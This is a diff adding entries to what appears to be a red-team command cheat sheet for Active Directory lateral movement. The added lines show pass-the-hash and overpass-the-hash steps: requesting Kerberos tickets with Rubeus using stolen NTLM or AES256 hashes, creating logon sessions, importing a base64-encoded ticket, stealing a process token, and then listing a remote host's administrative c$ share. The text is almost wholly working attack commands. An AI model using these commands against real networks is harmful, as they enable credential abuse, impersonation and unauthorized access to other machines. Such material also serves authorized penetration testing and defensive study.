@@ -220,6 +220,24 @@ pth <DOMAIN>\<USER> <NTLM HASH>
 ```
 execute-assembly Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /rc4:<NTLM HASH> /nowrap
 execute-assembly Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<AES256 HASH> /nowrap /opsec
+
+#Create new logon session
+make_token <DOMAIN>\<USER> DummyPass
+[System.IO.File]::WriteAllBytes("C:\Users\public\ticket.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
+kerberos_ticket_use C:\Users\public\ticket.kirbi
+
+ls \\<HOSTNAME>\c$
+```
+
+#### Overpass the hash elevated context
+```
+execute-assembly Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<AES256 HASH> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
+
+#output: [+] ProcessID       : <PID>
+
+steal_token <PID>
+
+ls \\<HOSTNAME>\c$
 ```
 
 #### Extract tickets
